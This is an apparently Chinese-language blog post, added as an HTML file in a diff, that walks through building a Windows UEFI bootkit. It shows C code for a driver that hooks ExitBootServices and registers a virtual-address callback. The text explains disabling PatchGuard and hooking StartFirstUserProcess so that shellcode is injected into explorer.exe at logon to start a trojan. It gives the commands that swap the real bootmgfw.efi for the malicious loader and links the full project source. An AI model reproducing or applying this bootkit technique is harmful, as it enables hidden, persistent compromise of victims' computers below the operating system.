@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="UEFI,Bootkit,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="没有找到适合的图片 好久没写博客了发一篇笔记">
+<meta name="keywords" content="UEFI,Bootkit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UEFI Bootkit">
+<meta property="og:url" content="http://yoursite.com/2021/12/02/UEFI-Bootkit/index.html">
+<meta property="og:site_name" content="WBGlIl">
+<meta property="og:description" content="没有找到适合的图片 好久没写博客了发一篇笔记">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/19mxAs8nZtUN6Rk.png">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/CAnwUi1mzI9P2QK.png">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/xzSZDgLEX1bHGom.png">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/goNC8Qlv4VDb7rj.png">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/LrEqkyab6fGVcou.png">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/6eHYvOoW3sTA8jy.png">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/voFc9h1KrqudYC2.png">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/RFU47Q9svZ5qkLx.png">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/dbSqYOxa7fwXliN.png">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/gwukMa2P9ejtcE8.png">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/gm4LFCripe6cf3a.png">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/9cGOZNBr2sfiCQ1.png">
+<meta property="og:image" content="https://i.loli.net/2021/12/02/zp2oUdDNu9ZSjEk.png">
+<meta property="og:updated_time" content="2021-12-02T13:15:24.981Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="UEFI Bootkit">
+<meta name="twitter:description" content="没有找到适合的图片 好久没写博客了发一篇笔记">
+<meta name="twitter:image" content="https://i.loli.net/2021/12/02/19mxAs8nZtUN6Rk.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/12/02/UEFI-Bootkit/">
+
+
+
+
+
+  <title>UEFI Bootkit | WBGlIl</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">WBGlIl</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/02/UEFI-Bootkit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="WBGlIl">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WBGlIl">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">UEFI Bootkit</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-12-02T21:14:25+08:00">
+                2021-12-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>没有找到适合的图片</p>
+<p>好久没写博客了发一篇笔记</p>
+<a id="more"></a>
+
+<p>MBR Bootkit不在叙述写这个的还是比较多的，UEFI Bootkit相较于MBR Bootkit从某种意义上来说开发要更为方便因为UEFI具有统一规范可以直接使用C/C++上手开发。</p>
+<p>在正式介绍前先来简单说一下UEFI下Windows启动过程<br><img src="https://i.loli.net/2021/12/02/19mxAs8nZtUN6Rk.png" alt="Pasted image 20211013115430.png"></p>
+<ol>
+<li>基本过程如下<br>PC开机,加电自检固件UEFI加载执行,初始化硬件</li>
+<li>固件UEFI根据启动项从EFI分区中加载并启动<code>\EFI\Microsoft\boot\bootmgfw.efi</code> （Windows boot manager）</li>
+<li>bootmgfw.efi加载启动Winload.efi（Windows Os loader）</li>
+<li>Winload.efi加载执行Ntoskrnl.exe并将控制权移交给操作系统</li>
+</ol>
+<p>我们此次开发的Bootkit从第二步入手直接替换bootmgfw.efi，为我们的loader，这个loader只有一个功能执行我们的UEFI驱动。我们的UEFI驱动在后门环境部署完成后回去加载执行原始的bootmgfw.efi进入正常的Windows引导流程（我们以上内容皆在Secure Boot关闭状态下为前提，如果Secure Boot开启会在执行我们的loader的时候就卡死因为签名校验不过）</p>
+<p>UEFI驱动入口点如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EFI_STATUS EFIAPI <span class="title">UefiMain</span><span class="params">(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	EFI_STATUS status;</span><br><span class="line">	<span class="comment">//CalculateCrc32</span></span><br><span class="line">	originalExitBootServices = gBS-&gt;ExitBootServices;</span><br><span class="line">	gBS-&gt;ExitBootServices = HookExitBootServices;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//注册事件回调，在os loader 调用SetVirtualAddressMap时通知我们</span></span><br><span class="line">	<span class="comment">//根据Edk2文档可以选用CreateEventEx配合gEfiEventVirtualAddressChangeGuid或EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE</span></span><br><span class="line">	<span class="comment">//SetVirtualAddressMapEvent</span></span><br><span class="line">	status = gBS-&gt;CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, NotifySetVirtualAddressMap, <span class="literal">NULL</span>, &amp;virtualEvent);</span><br><span class="line">	<span class="keyword">if</span> (status != EFI_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		DebugPrint(<span class="string">L"CreateEvent err"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	EFI_DEVICE_PATH* BootmgfwPath;</span><br><span class="line">	EFI_HANDLE BootmgfwImageHandle;</span><br><span class="line">	<span class="comment">//转换路径</span></span><br><span class="line">	UtilLocateFile(BootmgfwDiskPath, &amp;BootmgfwPath);</span><br><span class="line">	<span class="comment">//加载bootmgfw.efi</span></span><br><span class="line">	status = gBS-&gt;LoadImage(TRUE, ImageHandle, BootmgfwPath, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;BootmgfwImageHandle);</span><br><span class="line">	<span class="keyword">if</span> (status != EFI_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		DebugPrint(<span class="string">L"LoadImage No bootmgfw.efi"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//启动</span></span><br><span class="line">	status = gBS-&gt;StartImage(BootmgfwImageHandle, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们首先HOOK掉ExitBootServices因为此处是一个关键函数。</p>
+<p>在Winload.efi中会对这个函数进行调用，此函数的作用是结束启动服务（EFI Boot Service）标志着操作系统已经准备就绪，<a href="https://edk2-docs.gitbook.io/edk-ii-uefi-driver-writer-s-guide/5_uefi_services/readme.3/5312_exitbootservices" target="_blank" rel="noopener">官方文档</a><br><img src="https://i.loli.net/2021/12/02/CAnwUi1mzI9P2QK.png" alt="Pasted image 20211013124049.png"></p>
+<p>我们HOOK这里的目的是为了寻找被加载到内存中的ntoskrnl。为了寻找到ntoskrnl，我们需要先找到LOADER_PARAMETER_BLOCK这个结构体存储着所有的模块信息（具体请参照OslLoaderBlock函数）找到之后我们就可以开始遍历<br><img src="https://i.loli.net/2021/12/02/xzSZDgLEX1bHGom.png" alt="Pasted image 20211013125400.png"></p>
+<p>随后搜索内核中的KeInitAmd64SpecificState函数这个是PG初始化执行的函数我们需要对它进行修补<br><img src="https://i.loli.net/2021/12/02/goNC8Qlv4VDb7rj.png" alt="Pasted image 20211013125553.png"><br><img src="https://i.loli.net/2021/12/02/LrEqkyab6fGVcou.png" alt="Pasted image 20211013125939.png"></p>
+<p>继续搜索StartFirstUserProcess函数，这函数在内核中负责启动SMSS进程，但是我们并不能在这里直接HOOK它因为此时我们还处在物理地址，而StartFirstUserProcess函数在保护模式是虚拟地址等会系统启动我们需要转换后才能HOOK，我们这里只记录一下函数地址<br><img src="https://i.loli.net/2021/12/02/6eHYvOoW3sTA8jy.png" alt="Pasted image 20211013130708.png"></p>
+<p>在UefiMain函数中我们曾设置了一个回调函数NotifySetVirtualAddressMap，当os loader调用SetVirtualAddressMapEvent函数就会通知我们此时我们就可以在NotifySetVirtualAddressMap函数中通过ConvertPointer转换物理地址与虚拟地址对StartFirstUserProcess函数进行hook<br><img src="https://i.loli.net/2021/12/02/voFc9h1KrqudYC2.png" alt="Pasted image 20211013131441.png"></p>
+<p>剩下的就等待内核调用StartFirstUserProcess，然后我们创建一个系统线程去执行操作并调用原始的StartFirstUserProcess函数<br><img src="https://i.loli.net/2021/12/02/RFU47Q9svZ5qkLx.png" alt="Pasted image 20211013131612.png"></p>
+<p>在KernelMainThread线程里我们主要操作就是设置一个进程回调</p>
+<p><img src="https://i.loli.net/2021/12/02/dbSqYOxa7fwXliN.png" alt="Pasted image 20211013131731.png"></p>
+<p><img src="https://i.loli.net/2021/12/02/gwukMa2P9ejtcE8.png" alt="Pasted image 20211013145450.png"></p>
+<p>设置进程回调的目的是等待用户登录时创建explorer.exe进程，当截获后我们就可以向其中注入shellcode</p>
+<p>替换文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Admin\Desktop&gt; Get-Volume | Select DriveLetter, FileSystemLabel, FileSystemType, Size, Path | Format-Table -Autosize</span><br><span class="line"></span><br><span class="line">DriveLetter FileSystemLabel FileSystemType        Size Path</span><br><span class="line">----------- --------------- --------------        ---- ----</span><br><span class="line">                            FAT32            205520896 \\?\Volume&#123;5c8da14f-26c0-47cd-a477-74579d52e3c8&#125;\</span><br><span class="line">C                           NTFS           85553311744 \\?\Volume&#123;6a0f8490-1d99-448e-9c21-9016ebc6113f&#125;\</span><br><span class="line">D                           Unknown                  0 \\?\Volume&#123;89e0f2f6-d4fc-11eb-a1ef-806e6f6e6963&#125;\</span><br><span class="line"></span><br><span class="line">选择FAT32分区</span><br><span class="line"></span><br><span class="line">PS C:\Users\Admin\Desktop&gt; cmd /c rename <span class="string">"\\?\Volume&#123;5c8da14f-26c0-47cd-a477-74579d52e3c8&#125;\EFI\Microsoft\Boot\bootmgfw.efi"</span> <span class="string">"bootmgfw2.efi"</span></span><br><span class="line">PS C:\Users\Admin\Desktop&gt; cmd /c copy Test.efi <span class="string">"\\?\Volume&#123;5c8da14f-26c0-47cd-a477-74579d52e3c8&#125;\EFI\Microsoft\Boot\" /Y</span></span><br><span class="line"><span class="string">已复制         1 个文件。</span></span><br><span class="line"><span class="string">PS C:\Users\Admin\Desktop&gt; cmd /c copy load_test.efi "</span>\\?\Volume&#123;5c8da14f-26c0-47cd-a477-74579d52e3c8&#125;\EFI\Microsoft\Boot\bootmgfw.efi<span class="string">" /Y</span></span><br><span class="line"><span class="string">已复制         1 个文件。</span></span><br></pre></td></tr></table></figure>
+
+<p>当用户登录时会自动向其中注入shellcode启动木马</p>
+<p><img src="https://i.loli.net/2021/12/02/gm4LFCripe6cf3a.png" alt="Pasted image 20211013132128.png"></p>
+<p><img src="https://i.loli.net/2021/12/02/9cGOZNBr2sfiCQ1.png" alt="Pasted image 20211013134636.png"></p>
+<p><img src="https://i.loli.net/2021/12/02/zp2oUdDNu9ZSjEk.png" alt></p>
+<p>项目代码</p>
+<p><a href="https://github.com/WBGlIl/Test_UEFI" target="_blank" rel="noopener">https://github.com/WBGlIl/Test_UEFI</a></p>
+<p>编译请替换samples.default.props文件中的EDK_PATH和LibraryPath</p>
+<p>目标系统版本：Windows 21H1</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>UEFI Bootkit木马的一大难题在于Secure Boot，上面我们演示了非固件类的UEFI Bootkit，固件的类的UEFI Bookit可以做到即使更换硬盘都不会失效极其隐蔽但是固件UEFI需要写入SPI,这需要绕过多种保护措施但是一旦成功效果会非常好</p>
+<h2 id="相关参考"><a href="#相关参考" class="headerlink" title="相关参考"></a>相关参考</h2><p><a href="https://github.com/SamuelTulach/rainbow" target="_blank" rel="noopener">https://github.com/SamuelTulach/rainbow</a></p>
+<p><a href="https://wikileaks.org/ciav7p1/cms/page_36896783.html" target="_blank" rel="noopener">https://wikileaks.org/ciav7p1/cms/page_36896783.html</a></p>
+<p><a href="https://uefi.org/sites/default/files/resources/UEFI-Plugfest-WindowsBootEnvironment.pdf" target="_blank" rel="noopener">https://uefi.org/sites/default/files/resources/UEFI-Plugfest-WindowsBootEnvironment.pdf</a></p>
+<p><a href="https://www.kaspersky.com/about/press-releases/2021_finfisher-spyware-improves-its-arsenal-with-four-levels-of-obfuscation-uefi-infection-and-more" target="_blank" rel="noopener">https://www.kaspersky.com/about/press-releases/2021_finfisher-spyware-improves-its-arsenal-with-four-levels-of-obfuscation-uefi-infection-and-more</a></p>
+<p><a href="https://www.4hou.com/posts/PrM2" target="_blank" rel="noopener">https://www.4hou.com/posts/PrM2</a></p>
+<p><a href="https://www.4hou.com/posts/8O52" target="_blank" rel="noopener">https://www.4hou.com/posts/8O52</a></p>
+<p><a href="https://edk2-docs.gitbook.io/" target="_blank" rel="noopener">https://edk2-docs.gitbook.io/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/UEFI/" rel="tag"># UEFI</a>
+          
+            <a href="/tags/Bootkit/" rel="tag"># Bootkit</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/07/27/一份未完成的cobalt-strike-beacon代码/" rel="next" title="一份未完成的cobalt strike beacon代码">
+                <i class="fa fa-chevron-left"></i> 一份未完成的cobalt strike beacon代码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/12/22/恢复windows-server-2022-剪贴板历史记录功能/" rel="prev" title="恢复windows server 2019 剪贴板历史记录功能">
+                恢复windows server 2019 剪贴板历史记录功能 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="WBGlIl">
+            
+              <p class="site-author-name" itemprop="name">WBGlIl</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                大佬们的博客
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sariel.top/" title="只因不值得" target="_blank">只因不值得</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://422926799.github.io/" title="九世" target="_blank">九世</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ggsec.cn/" title="Demon" target="_blank">Demon</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secist.com/" title="即刻安全" target="_blank">即刻安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nek0y4nsu.github.io/" title="Yansu" target="_blank">Yansu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blue-bird1.github.io/" title="青鸟" target="_blank">青鸟</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://qwq.moe/" title="蚊子の博客" target="_blank">蚊子の博客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://9bie.org/" title="biebie" target="_blank">biebie</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关参考"><span class="nav-number">2.</span> <span class="nav-text">相关参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WBGlIl</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+
